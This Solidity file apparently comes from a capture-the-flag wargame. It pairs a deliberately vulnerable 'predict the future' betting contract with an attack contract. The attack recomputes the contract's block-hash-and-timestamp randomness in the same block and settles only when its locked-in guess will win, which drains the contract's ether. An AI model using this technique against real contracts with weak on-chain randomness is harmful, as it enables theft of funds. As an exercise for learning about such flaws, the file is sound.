pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureAttack {
    PredictTheFutureChallenge challenge;

    function PredictTheFutureAttack(address _challengeAddress) public payable {
        challenge = PredictTheFutureChallenge(_challengeAddress);
    }

    function lockInGuess() public payable {
        challenge.lockInGuess.value(1 ether)(0);
    }

    function attack() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require(answer == 0);

        challenge.settle();
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
